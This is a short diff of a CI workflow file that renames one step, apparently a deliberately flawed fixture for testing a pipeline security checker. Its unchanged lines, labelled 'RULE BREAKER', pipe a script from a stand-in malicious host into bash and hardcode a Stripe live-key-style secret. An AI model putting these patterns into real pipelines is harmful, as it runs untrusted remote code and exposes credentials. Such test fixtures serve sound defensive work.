@@ -9,7 +9,7 @@ jobs:
         # RULE BREAKER 1: Piping curl to bash
         run: curl -sL http://malicious.com/script.sh | bash
 
-      - name: Leaking Secret
+      - name: Leaking Secrets
         env:
           # RULE BREAKER 2: Hardcoded Secret
           STRIPE_KEY: "sk_live_51HvT..."
